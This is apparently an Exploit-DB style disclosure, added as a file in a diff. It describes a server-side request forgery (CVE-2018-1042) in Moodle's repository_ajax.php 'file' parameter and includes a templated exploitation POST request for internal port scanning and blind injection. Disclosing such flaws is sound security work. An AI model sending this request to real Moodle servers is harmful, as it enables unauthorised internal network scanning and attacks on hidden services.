@@ -1,0 +1,31 @@
+# Exploit Title: Server Side Request Forgery in Moodle Filepicker
+# Google Dork: /
+# Date: 2019-07-25
+# Exploit Author: Fabian Mosch & Nick Theisinger (r-tec IT Security GmbH)
+# Vendor Homepage: https://moodle.org/
+# Software Link: https://github.com/moodle/moodle
+# Version: Moodle Versions 3.4, 3.3, 3.3.3, 3.2 to 3.2.6, 3.1 to 3.1.9 and 3.5.2
+# Tested on: Moodle Version 3.5.2
+# CVE : CVE-2018-1042
+
+We found a SSRF vulnerability for Moodle version 3.5.2. An authenticated attacker can scan the internal network and exploit internal web services with blind injections. Probably we are dealing with CVE-2018-1042 mentioned here:
+https://moodle.org/mod/forum/discuss.php?d=364381
+
+In version 3.5.2 we were not able to view all internal web server content, only pictures (PNG, GIF, SVN and so on) were displayed as a JSON-list. But it is possible to do internal port scans via http:// and https:// protocols. Open ports with no response for HTTP requests resulted in a timeout, SSL services like OpenSSH gave an SSL Error. For web applications the HTTP headers can be found in the response (403 forbidden, 404 not Found and so on). Found web applications can be attacked via HTTP GET requests. The vulnerable script is "repository_ajax.php" and the parameter is "file".
+
+Example exploitation request:
+
+POST /repository/repository_ajax.php?action=signin HTTP/1.1
+Host: VulnerableMoodleHost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: */*
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: https://VulnerableMoodleHost/user/files.php
+X-Requested-With: XMLHttpRequest
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Content-Length: 165
+Connection: close
+Cookie: MoodleSession=xxxxx;
+
+file=InternalURL?parameter=XXEInjection&repo_id=5&p=&page=&env=filemanager&sesskey=xxxxxxxxxx
